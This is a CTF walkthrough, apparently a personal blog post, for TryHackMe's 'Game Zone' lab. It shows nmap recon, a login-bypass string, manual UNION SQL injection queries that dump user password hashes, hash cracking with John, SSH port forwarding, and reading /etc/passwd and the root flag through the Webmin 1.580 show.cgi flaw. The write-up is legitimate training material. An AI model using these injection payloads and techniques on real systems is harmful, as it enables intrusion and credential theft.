---
title: "Walk-through of Game Zone from TryHackMe"
header:
  teaser: /assets/images/2021-02-10-22-06-58.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - Linpeas
  - SQLi
  - hashcrack
---

## Machine Information

![gamezone](/assets/images/2021-02-10-22-06-58.png)

Game Zone is rated as an easy difficulty room on TryHackMe. This Linux based server hosts a simple web application that we use to gain an initial foothold by exploiting it using SQLi techniques. We crack a password retrieved from the database and then gain access to SSH. From there we enumerate and find a vulnerable CMS. Then using SSH port forwarding we access it from behind a firewall.

 Skills required are basic knowledge of SQLi techniques, file and server enumeration to find escalation paths. Skills learned are more in depth SQLi, password cracking, researching exploits to use on discovered vulnerabilities, and SSH port forwarding.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - GameZone](https://tryhackme.com/room/gamezone) |
| Machine Release Date | 28th August 2019 |
| Date I Completed It | 10th February 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
root@kali:/home/kali/thm/gamezone# ports=$(nmap -p- --min-rate=1000 -T4 10.10.42.137 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:/home/kali/thm/gamezone# nmap -p$ports -sC -sV -oA gamezone 10.10.42.137
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-07 22:17 GMT
Nmap scan report for 10.10.42.137
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
root@kali:/home/kali/thm/gamezone# 
```

## Task 1

Just two ports open, let's start with the easy one by opening a web browser on port 80:

![gamezone-home](/assets/images/2021-02-07-22-19-57.png)

You should recognise the main character on the home page which will give you the answer to Task 1.

## Task 2

The room description for Task 2 tells you that you're dealing with sql injection, and explains how to use a simple bypass technique of '1=1 -- - to login without a username or password:

![gamezone-login](/assets/images/2021-02-07-22-27-46.png)

After we bypass the login form we end up here:

![gamezone-portal](/assets/images/2021-02-07-22-29-56.png)

The name of the page we have landed on let's us answer Task 2.

## Task 3

If you're following the guide for the room, then at this point you could use [SQLMap](https://github.com/sqlmapproject/sqlmap) and [BurpSuite](https://portswigger.net/burp) to automate the process of dumping the database and getting the credentials. However instead of using tools to make it easy I chose to go old school and do manual SQL injection to obtain the information.

First we use ORDER BY to find how many columns there are in the table:

![gamezone-orderby](/assets/images/2021-02-07-22-40-33.png)

We repeat increasing the number until we get an error:

![gamezone-ordererror](/assets/images/2021-02-07-22-38-06.png)

It errors at 4, so we know there are 3 columns, let's pull their information out using a UNION statement:

![gamezone-union](/assets/images/2021-02-07-22-44-16.png)

We see that column 2 is the title field, and 3 is the review field.

The schemata table in MySQL provides information about databases held within it. You can find useful information about this [here](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html).

We can use this table to see all databases in the system:

```text
' union select 1,2, schema_name FROM information_schema.schemata; -- -
```

![gamezone-dbs](/assets/images/2021-02-07-22-51-05.png)

The database db is what we are looking for, let's see what tables are in it:

```text
' union select 1,2, TABLE_NAME FROM information_schema.TABLES WHERE table_schema='db';-- -
```

![gamezone-dbtables](/assets/images/2021-02-07-22-53-17.png)

We have two tables, post and users. Let's try users first and hope we can get usernames and passwords:

```text
' union select 1,table_name, column_name FROM information_schema.columns WHERE table_name = 'users' ;-- -
```

![gamezone-users](/assets/images/2021-02-07-22-55-18.png)

We see there is a pwd table, let's have a look at that:

```text
' union select 1, username , pwd from users;-- -
```

![gamezone-pwd](/assets/images/2021-02-07-22-56-56.png)

We now have all the information needed to answer the questions on Task 3.

Let's use an online [hash analyzer](https://www.tunnelsup.com/hash-analyzer/)
 to find out what type we have:

![gamezone-hash](/assets/images/2021-02-07-23-00-30.png)

We now know it's a SHA2-256 hash, let's see if we can find an online decrypter:

![gamezone-decrypt](/assets/images/2021-02-07-23-05-51.png)

First result looks good, let's put our hash in and see if they can decrypt it:

![gamezone-result](/assets/images/2021-02-07-23-06-59.png)

Excellent, it's one that's been seen before so we have our password.

## Task 4

If you're following the room guide then you could have used JohnTheRipper instead. First save found username and hash to a file:

```text
root@kali:/home/kali/thm/gamezone# cat hash.txt
agent47:<HIDDEN>
```

Then use the rockyou wordlist against it:

```text
root@kali:/home/kali/thm/gamezone# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>    (agent47)
1g 0:00:00:00 DONE (2021-02-08 22:14) 3.030g/s 8837Kp/s 8837Kc/s 8837KC/s vimivi..veluca
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

You now have the dehashed password which let's you answer a question on Task 4.

We have a username and password, let's try to ssh on to the box:

```text
root@kali:/home/kali/thm/gamezone# ssh agent47@10.10.42.137
agent47@10.10.42.137's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```

We're in. Let's see where we are:

```text
agent47@gamezone:~$ ls
user.txt
```

How convenient, let's grab the user flag before we move on:

```text
agent47@gamezone:~$ cat user.txt 
<HIDDEN>
```

You can now answer the last question on Task 4.

## Task 5

Let's enumerate with [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and see if we can find our escalation path. First grab it from Github and start a python server on Kali so we can get to it from the box. Then switch back to our ssh session and pull LinPEAS across:

```text
agent47@gamezone:~$ wget http://10.14.6.200:8000/linpeas.sh
--2021-02-08 16:26:30--  http://10.14.6.200:8000/linpeas.sh
Connecting to 10.14.6.200:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 320037 (313K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[==================================>] 312.54K  1.19MB/s    in 0.3s    

2021-02-08 16:26:31 (1.19 MB/s) - ‘linpeas.sh’ saved [320037/320037]
```

Now run the script and have a look at the output:

```text
agent47@gamezone:~$ bash linpeas.sh 
 Starting linpeas. Caching Writable Folders...
<SNIP>
```

Looking through the lengthy output we see a couple of interesting things. On the active ports section we have something listening on port 10000:

```text
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -               
tcp        0      0 10.10.201.153:22        10.14.6.200:58046       ESTABLISHED -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 fe80::1:13128           :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:10000           0.0.0.0:*                           -               
```

This didn't show up on the nmap scan, so must be behind a firewall. You now also have the information needed to answer a question on Task 5

We also see a file called webmin-setup.out in root:

```text
[+] Unexpected in root
/initrd.img
/webmin-setup.out
/lost+found
/vmlinuz.old
/initrd.img.old
```

Looking at that we see webmin is installed, with config files in /etc/webmin, in there we find a file called version:

```text
agent47@gamezone:~$ cat /etc/webmin/version 
1.580
```

You can now answer the last two questions on Task 5.

## Task 6

So we have webmin 1.580 installed, let's look at searchsploit for an exploit:

```text
kali@kali:~$ searchsploit webmin 1.58
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)   | unix/remote/21851.rb
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)     | multiple/remote/2017.pl
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)      | multiple/remote/1997.php
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)           | linux/webapps/47330.rb
------------------------------------------------------------------------ ---------------------------------
```

First hit is for our version, let's have a look at it:

```text
kali@kali:~$ searchsploit -x unix/remote/21851.rb
  Exploit: Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/21851
     Path: /usr/share/exploitdb/exploits/unix/remote/21851.rb
File Type: Ruby script, ASCII text, with CRLF line terminators
```

In there we see how the exploit works:

```text
This module exploits an arbitrary command execution vulnerability in Webmin 1.580. The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges.
```

So first we need to get to the file manager module of webmin, and we need to authenticate to it, then we can use the exploit to execute commands as root.

A technique for accessing ports hidden behind a firewall is to use port forwarding over an established SSH tunnel to your victim. You can then access that port from your attack machine using localhost. The ssh.com site has a good explanation and example [here](https://www.ssh.com/ssh/tunneling/example).

The room description also explains the intended attack path, so you can follow that if needed.

To set up our tunnel we simply ssh to the machine as before but with an extra parameter -L, which is for local port forwarding:

```text
root@kali:/home/kali/thm/gamezone# ssh -L 10000:localhost:10000 agent47@10.10.42.137
agent47@10.10.42.137's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
Last login: Mon Feb  8 16:18:38 2021 from 10.14.6.200
agent47@gamezone:~$ 
```

Now we can browse to port 10000 on our Kali machine and get forwarded to that port on the victim server:

![gamezone-webmin](/assets/images/2021-02-08-23-00-29.png)

We can guess that the login for this admin panel uses the same credentials as before. I try a username of agent47 and the password we've cracked, which works and we end up here:

![gamezone-panel](/assets/images/2021-02-09-22-26-33.png)

If you're following the guide for the room then at this point you could fire up Meterpreter and use a module within the framework to get yourself a root shell. However if you read how the exploit works it's really simple to just read files from within the webmin console. To test this lets have a look at the passwd file:

![gamezone-passwd](/assets/images/2021-02-09-22-33-26.png)

As you can see all I had to do was add /file/show.cgi and then the path and name of the file I want to look at.

Using this simple technique we can grab the root flag:

![gamezone-root](/assets/images/2021-02-09-22-35-24.png)

You can answer the final section by completing Task 6.

All done. See you next time.
